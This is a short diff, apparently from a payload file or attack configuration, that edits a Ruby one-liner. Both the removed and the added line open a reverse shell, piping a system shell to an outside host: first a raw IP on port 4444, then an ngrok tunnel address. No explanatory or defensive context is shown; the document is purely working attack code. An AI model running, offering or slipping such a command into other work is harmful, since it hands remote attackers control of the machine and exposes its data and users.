@@ -1,1 +1,1 @@
-ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("88.225.219.22",4444))'
+ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("0.tcp.ngrok.io",12085))'
